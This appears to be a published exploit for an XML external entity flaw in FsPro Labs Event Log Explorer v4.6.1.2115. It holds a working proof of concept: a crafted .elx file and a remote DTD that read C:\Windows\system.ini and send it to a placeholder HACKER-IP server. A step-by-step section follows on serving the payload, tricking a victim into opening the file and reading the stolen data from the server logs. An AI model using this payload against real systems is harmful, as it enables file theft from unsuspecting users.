# Title: FsPro Labs Event Log Explorer v4.6.1.2115 - XML External Entity Injection
# Author: hyp3rlinx
# Date: 2018-09-01
# Vendor: www.eventlogxp.com
# Software: https://eventlogxp.com/download.php
# Affected Component: elex.exe
# CVE: N/A

# Description:
# Upon opening a specially crafted .ELX file in Event Log Explorer, remote attackers 
# can potentially gain access to local files.

# PoC
python -m SimpleHTTPServer
 
"test.elx"

<?xml version="1.0"?>
<!DOCTYPE gga [ 
<!ENTITY % file SYSTEM "C:\Windows\system.ini">
<!ENTITY % dtd SYSTEM "http://HACKER-IP:8000/payload.dtd">
%dtd;]>
<infodisclosa>&send;</infodisclosa>

Instruction:

Prerequisites
Event Log Explorer installed on the target system.
Python installed on the attacker's machine to serve the malicious XML payload.

Steps to Exploit
On the Attacking Machine:

Set up a simple HTTP server to host the payload.
python -m SimpleHTTPServer 8000

Create a DTD file (payload.dtd) on the attacking machine (e.g., in the same directory as the HTTP server):
<!ENTITY % data SYSTEM "file:///C:/Windows/system.ini">
<!ENTITY % send "<!ENTITY &#x25; ext SYSTEM 'http://HACKER-IP:8000/?%data;'>">
%send;

Craft the Malicious .ELX File:
Create a file named test.elx with the following contents:
<?xml version="1.0"?>
<!DOCTYPE gga [ 
<!ENTITY % file SYSTEM "C:/Windows/system.ini">
<!ENTITY % dtd SYSTEM "http://HACKER-IP:8000/payload.dtd">
%dtd;]>
<infodisclosa>&send;</infodisclosa>
Replace HACKER-IP with your attacking machine's IP address (e.g., 192.168.1.100).

On the Victim Machine:

Trick the victim into opening the malicious test.elx file in Event Log Explorer.

On the Attacking Machine:

When the victim opens the test.elx file, the XML parser will fetch and execute the remote DTD file (payload.dtd), causing the contents of C:/Windows/system.ini to be sent to the attacker's server.

The sensitive file data will be exfiltrated and visible in the HTTP server logs.